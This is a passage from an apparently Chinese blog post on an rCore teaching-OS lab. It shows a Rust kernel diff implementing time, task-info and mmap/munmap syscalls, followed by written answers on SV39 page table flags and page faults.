allocator</span><span class="token prefix unchanged"> </span><span class="token line">pub fn frame_allocator_test() &#123;</span></span>diff --git a/os/src/mm/memory_set.rs b/os/src/mm/memory_set.rsindex 7a7b7ea..fca0b7f 100644<span class="token coord">--- a/os/src/mm/memory_set.rs</span><span class="token coord">+++ b/os/src/mm/memory_set.rs</span>@@ -63,6 +63,19 @@ impl MemorySet &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            None,</span><span class="token prefix unchanged"> </span><span class="token line">        );</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Remove framed area</span><span class="token prefix inserted">+</span><span class="token line">    pub fn remove_framed_area(&amp;mut self, range: VPNRange) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for area in self.areas.iter_mut() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if area.vpn_range.get_start().0 == range.get_start().0 </span><span class="token prefix inserted">+</span><span class="token line">                &amp;&amp; area.vpn_range.get_end().0 == range.get_end().0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">                area.unmap(&amp;mut self.page_table);</span><span class="token prefix inserted">+</span><span class="token line">                break;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            idx += 1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        self.areas.remove(idx);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    fn push(&amp;mut self, mut map_area: MapArea, data: Option&lt;&amp;[u8]>) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        map_area.map(&amp;mut self.page_table);</span><span class="token prefix unchanged"> </span><span class="token line">        if let Some(data) = data &#123;</span></span>diff --git a/os/src/mm/mod.rs b/os/src/mm/mod.rsindex 06f045c..8f21283 100644<span class="token coord">--- a/os/src/mm/mod.rs</span><span class="token coord">+++ b/os/src/mm/mod.rs</span>@@ -12,9 +12,9 @@ mod heap_allocator;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">mod memory_set;</span><span class="token prefix unchanged"> </span><span class="token line">mod page_table;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum&#125;;</span><span class="token prefix deleted">-</span><span class="token line">use address::&#123;StepByOne, VPNRange&#125;;</span><span class="token prefix deleted">-</span><span class="token line">pub use frame_allocator::&#123;frame_alloc, FrameTracker&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum, VPNRange&#125;;</span><span class="token prefix inserted">+</span><span class="token line">use address::StepByOne;</span><span class="token prefix inserted">+</span><span class="token line">pub use frame_allocator::&#123;frame_alloc, FrameTracker, is_mem_sufficient&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::remap_test;</span><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::&#123;kernel_stack_position, MapPermission, MemorySet, KERNEL_SPACE&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">pub use page_table::&#123;translated_byte_buffer, PageTableEntry&#125;;</span></span>diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex 4a5297d..129ed7f 100644<span class="token coord">--- a/os/src/syscall/mod.rs</span><span class="token coord">+++ b/os/src/syscall/mod.rs</span>@@ -30,8 +30,11 @@ mod process;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use fs::*;</span><span class="token prefix unchanged"> </span><span class="token line">use process::*;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::task::inc_syscall_times;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// handle syscall exception with `syscall_id` and other arguments</span><span class="token prefix unchanged"> </span><span class="token line">pub fn syscall(syscall_id: usize, args: [usize; 3]) -> isize &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    inc_syscall_times(syscall_id);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    match syscall_id &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_WRITE => sys_write(args[0], args[1] as *const u8, args[2]),</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_EXIT => sys_exit(args[0] as i32),</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex e2f6662..e23a90c 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,9 +1,11 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Process management syscalls</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    config::MAX_SYSCALL_NUM,</span><span class="token prefix deleted">-</span><span class="token line">    task::&#123;</span><span class="token prefix deleted">-</span><span class="token line">        change_program_brk, exit_current_and_run_next, suspend_current_and_run_next, TaskStatus,</span><span class="token prefix deleted">-</span><span class="token line">    &#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    config::MAX_SYSCALL_NUM, mm::translated_byte_buffer, task::&#123;</span><span class="token prefix inserted">+</span><span class="token line">        change_program_brk, current_user_token, exit_current_and_run_next, get_scheduled_timespan, get_syscall_times, suspend_current_and_run_next, task_mmap, task_munmap, TaskStatus</span><span class="token prefix inserted">+</span><span class="token line">    &#125;, timer::get_time_us</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#[repr(C)]</span></span>@@ -43,7 +45,21 @@ pub fn sys_yield() -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TimeVal`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!("kernel: sys_get_time");</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let _us = get_time_us();</span><span class="token prefix inserted">+</span><span class="token line">    let time_val = TimeVal &#123;</span><span class="token prefix inserted">+</span><span class="token line">        sec: _us / 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">        usec: _us % 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr = time_val_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Finish sys_task_info to pass testcases</span></span>@@ -51,19 +67,33 @@ pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TaskInfo`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_task_info(_ti: *mut TaskInfo) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!("kernel: sys_task_info NOT IMPLEMENTED YET!");</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let task_info = TaskInfo &#123;</span><span class="token prefix inserted">+</span><span class="token line">        status: TaskStatus::Running,</span><span class="token prefix inserted">+</span><span class="token line">        syscall_times: get_syscall_times(),</span><span class="token prefix inserted">+</span><span class="token line">        time: get_scheduled_timespan(),</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ti as *const u8, size_of::&lt;TaskInfo>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_info_ptr = &amp;task_info as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr = task_info_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// YOUR JOB: Implement mmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_mmap(_start: usize, _len: usize, _port: usize) -> isize &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    trace!("kernel: sys_mmap NOT IMPLEMENTED YET!");</span><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    // trace!("kernel: sys_mmap NOT IMPLEMENTED YET!");</span><span class="token prefix inserted">+</span><span class="token line">    task_mmap(_start, _len, _port)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// YOUR JOB: Implement munmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_munmap(_start: usize, _len: usize) -> isize &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    trace!("kernel: sys_munmap NOT IMPLEMENTED YET!");</span><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    // trace!("kernel: sys_munmap NOT IMPLEMENTED YET!");</span><span class="token prefix inserted">+</span><span class="token line">    task_munmap(_start, _len)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line">/// change data segment size</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_sbrk(size: i32) -> isize &#123;</span></span>diff --git a/os/src/task/mod.rs b/os/src/task/mod.rsindex a745df8..460b23b 100644<span class="token coord">--- a/os/src/task/mod.rs</span><span class="token coord">+++ b/os/src/task/mod.rs</span>@@ -14,8 +14,11 @@ mod switch;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#[allow(clippy::module_inception)]</span><span class="token prefix unchanged"> </span><span class="token line">mod task;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::MAX_SYSCALL_NUM;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::loader::&#123;get_app_data, get_num_app&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::mm::&#123;is_mem_sufficient, MapPermission, VPNRange, VirtAddr, VirtPageNum&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::TrapContext;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span></span>@@ -140,6 +143,11 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            let mut inner = self.inner.exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">            let current = inner.current_task;</span><span class="token prefix unchanged"> </span><span class="token line">            inner.tasks[next].task_status = TaskStatus::Running;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            // if the task is being called for the first time,</span><span class="token prefix inserted">+</span><span class="token line">            if inner.tasks[next].time == 0usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">                // then set it to the current time</span><span class="token prefix inserted">+</span><span class="token line">                inner.tasks[next].time = get_time_ms();</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            inner.current_task = next;</span><span class="token prefix unchanged"> </span><span class="token line">            let current_task_cx_ptr = &amp;mut inner.tasks[current].task_cx as *mut TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">            let next_task_cx_ptr = &amp;inner.tasks[next].task_cx as *const TaskContext;</span></span>@@ -153,6 +161,80 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            panic!("All applications completed!");</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Get task's syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_syscall_times(&amp;self) -> [u32; MAX_SYSCALL_NUM] &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[current].syscall_times.clone()</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Get task's time span between current time and first scheduled time</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_scheduled_timespan(&amp;self) -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        get_time_ms() - inner.tasks[current].time</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">        if syscall_id >= MAX_SYSCALL_NUM &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return false;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let current = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[current].syscall_times[syscall_id] += 1;</span><span class="token prefix inserted">+</span><span class="token line">        true</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Map some pages to memory_set</span><span class="token prefix inserted">+</span><span class="token line">    fn mmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr, port: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let cur = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil()</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        </span><span class="token prefix inserted">+</span><span class="token line">        // 3. Check if trying to map mapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.tasks[cur].memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // push a new map_area to current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        let perm = MapPermission::from_bits((port as u8) &lt;&lt; 1).unwrap() | MapPermission::U;</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[cur].memory_set.insert_framed_area(start_va, end_va, perm);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Unmap some pages in memory set</span><span class="token prefix inserted">+</span><span class="token line">    fn munmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let cur = inner.current_task;</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil(),</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // 1. Check if trying to unmap unmapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.tasks[cur].memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if !pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // remove some pages from current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        inner.tasks[cur].memory_set.remove_framed_area(vpn_range);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// Run the first task in task list.</span></span>@@ -202,3 +284,46 @@ pub fn current_trap_cx() -> &amp;'static mut TrapContext &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub fn change_program_brk(size: i32) -> Option&lt;usize> &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    TASK_MANAGER.change_current_program_brk(size)</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Get current task's syscall times</span><span class="token prefix inserted">+</span><span class="token line">pub fn get_syscall_times() -> [u32; MAX_SYSCALL_NUM] &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.get_syscall_times()</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Get current task's time span between current time and first scheduled time</span><span class="token prefix inserted">+</span><span class="token line">pub fn get_scheduled_timespan() -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.get_scheduled_timespan()</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Increase current task's syscall times</span><span class="token prefix inserted">+</span><span class="token line">pub fn inc_syscall_times(syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.inc_syscall_times(syscall_id)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Map some pages to current task's memory_set</span><span class="token prefix inserted">+</span><span class="token line">pub fn task_mmap(start: usize, len: usize, port: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(start);</span><span class="token prefix inserted">+</span><span class="token line">    // 1. illegal start virtual address or port</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() || port &amp; !0x7 != 0 || port &amp; 0x7 == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    // 2. Check is there sufficient physical memory</span><span class="token prefix inserted">+</span><span class="token line">    if !is_mem_sufficient(len) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(start + len);</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.mmap(start_va, end_va, port)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Unmap some pages in current task's memory set</span><span class="token prefix inserted">+</span><span class="token line">pub fn task_munmap(start: usize, len: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(start);</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(start + len);</span><span class="token prefix inserted">+</span><span class="token line">    TASK_MANAGER.munmap(start_va, end_va)</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/os/src/task/task.rs b/os/src/task/task.rsindex dce6981..396342d 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span><span class="token coord">@@ -1,6 +1,6 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Types related to task management</span><span class="token prefix unchanged"> </span><span class="token line">use super::TaskContext;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::TRAP_CONTEXT_BASE;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MAX_SYSCALL_NUM, TRAP_CONTEXT_BASE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::mm::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    kernel_stack_position, MapPermission, MemorySet, PhysPageNum, VirtAddr, KERNEL_SPACE,</span><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>@@ -28,6 +28,12 @@ pub struct TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">    /// Program break</span><span class="token prefix unchanged"> </span><span class="token line">    pub program_brk: usize,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub syscall_times: [u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The first time the task was scheduled</span><span class="token prefix inserted">+</span><span class="token line">    pub time: usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlock &#123;</span></span>@@ -63,6 +69,8 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            base_size: user_sp,</span><span class="token prefix unchanged"> </span><span class="token line">            heap_bottom: user_sp,</span><span class="token prefix unchanged"> </span><span class="token line">            program_brk: user_sp,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">            time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        &#125;;</span><span class="token prefix unchanged"> </span><span class="token line">        // prepare TrapContext in user space</span><span class="token prefix unchanged"> </span><span class="token line">        let trap_cx = task_control_block.get_trap_cx();</span></span></code></pre><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><h2 id="t1"><a href="#t1" class="headerlink" title="t1"></a>t1</h2><p><strong>Q:</strong> 请列举 SV39 页表页表项的组成，描述其中的标志位有何作用？</p><p><strong>A:</strong> </p><p><img src="/2024/11/01/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter4%E7%BB%83%E4%B9%A0/pte.png"></p><p>上图为 SV39 分页模式下的页表项，其中 <code>[53:10]</code> 这 44 位是物理页号，最低的 8 位 <code>[7:0]</code> 则是标志位，它们的含义如下：</p><ul><li>仅当 V(Valid) 位为 1 时，页表项才是合法的；</li><li>R/W/X 分别控制索引到这个页表项的对应虚拟页面是否允许读/写/取指；</li><li>U 控制索引到这个页表项的对应虚拟页面是否在 CPU 处于 U 特权级的情况下是否被允许访问；</li><li>G 代表全局属性，当 G 被设置为 1 时，表示该页表项所描述的页面是全局共享的；</li><li>A(Accessed) 记录自从页表项上的这一位被清零之后，页表项的对应虚拟页面是否被访问过；</li><li>D(Dirty) 则记录自从页表项上的这一位被清零之后，页表项的对应虚拟页表是否被修改过。</li></ul><h2 id="t2"><a href="#t2" class="headerlink" title="t2"></a>t2</h2><p>缺页指的是进程访问页面时页面不在页表中或在页表中无效的现象，此时 MMU 将会返回一个中断， 告知 os 进程内存访问出了问题。os 选择填补页表并重新执行异常指令或者杀死进程。</p><p><strong>Q1:</strong> 请问哪些异常可能是缺页导致的？</p><p><strong>A1:</strong> 进程访问未映射的内存页面、访问已被换出到磁盘的页面、进程尝试以不正确的权限访问页面（例如写入只读页面）。</p><p><strong>Q2:</strong> 发生缺页时，描述相关重要寄存器的值，上次实验描述过的可以简略。</p><p><strong>A2:</strong> 以下是与缺页相关的 CSR 寄存器的值：</p><ul><li><code>scause</code>: 记录导致异常的原因。对于缺页异常，该寄存器的值包含异常的类型和特定的错误代码，指示发生了缺页异常。</li><li><code>sstatus</code>: 记录处理器当前状态，其中 SPP 段记录当前特权等级。</li><li><code>sepc</code>: 当缺页异常发生时，<code>sepc</code> 会保存出错指令的地址，以便在异常处理完成后能够返回到该指令重新执行。</li><li><code>stval</code>: 在缺页异常情况下，<code>stval</code> 会存储导致缺页的虚拟地址，帮助操作系统确定是哪个页面缺失。</li></ul><p>缺页有两个常见的原因，其一是 Lazy 策略，也就是直到内存页面被访问才实际进行页表操作。 比如，一个程序被执行时，进程的代码段理论上需要从磁盘加载到内存。但是 os 并不会马上这样做， 而是会保存 <code>.text</code> 段在磁盘的位置信息，在这些代码第一次被执行时才完成从磁盘的加载操作。</p><p><strong>Q3:</strong> 这样做有哪些好处？</p><p><strong>A3:</strong> 只在需要时加载页面，避免不必要的内存占用，允许系统将更多进程同时驻留在内存中；程序在启动时不必立即加载所有代码和数据，从而减少初始加载时间。</p><p>其实，我们的 mmap 也可以采取 Lazy 策略，比如：一个用户进程先后申请了 10G 的内存空间， 然后用了其中 1M 就直接退出了。按照现在的做法，我们显然亏大了，进行了很多没有意义的页表操作。</p><p><strong>Q4:</strong> 处理 10G 连续的内存页面，对应的 SV39 